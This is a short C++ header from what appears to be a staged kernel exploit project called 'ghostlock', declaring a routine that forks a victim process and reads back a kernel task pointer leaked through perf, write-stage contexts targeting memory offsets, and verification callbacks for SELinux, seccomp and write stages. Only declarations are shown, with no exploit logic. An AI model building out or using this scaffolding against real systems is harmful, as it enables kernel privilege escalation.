#ifndef GHOSTLOCK_VICTIM_PROCESS_HPP
#define GHOSTLOCK_VICTIM_PROCESS_HPP

#include "common.h"
#include "session/victim_context.hpp"

namespace ghostlock::victim {

/* Verification contexts handed to retry_write_stage callbacks. */
struct w2_stage_context {
    VictimContext *pipes;
};

struct w3_stage_context {
    VictimContext *pipes;
    int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

/* Fork the victim and read back the task pointer perf leaked. */
pid_t spawn_victim(VictimContext *p, uintptr_t *task_out);

/* Stage verification callbacks. */
int verify_selinux_stage(void *context);
int verify_w2_stage(void *context);
int verify_seccomp_probe_stage(void *context);
int verify_leaf_dir_stage(void *context);

}  // namespace ghostlock::victim

#endif
